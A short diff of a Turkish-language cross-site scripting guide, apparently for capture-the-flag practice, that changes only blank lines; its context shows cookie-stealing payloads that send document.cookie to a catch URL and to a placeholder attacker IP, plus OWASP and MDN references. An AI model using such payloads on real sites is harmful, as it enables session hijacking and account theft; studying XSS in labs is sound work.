@@ -107,6 +107,8 @@ fetch('https://ctf-platform.com/catch?flag=' + document.cookie);
 
 
 <script>var i=new Image(); i.src="http://SENIN_VPN_IP_ADRESIN:8000/?cookie="+document.cookie;</script>
+
+
 ⚠️ Not: HTTPOnly cookie’ler JavaScript ile okunamaz.
 
 ```
@@ -184,7 +186,7 @@ fetch('/api/sendMessage', {
 ---
 
 ## 📚 Kaynaklar
-
+  
 ### Resmi Belgeler
 - [OWASP XSS](https://owasp.org/www-community/attacks/xss/)
 - [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting)
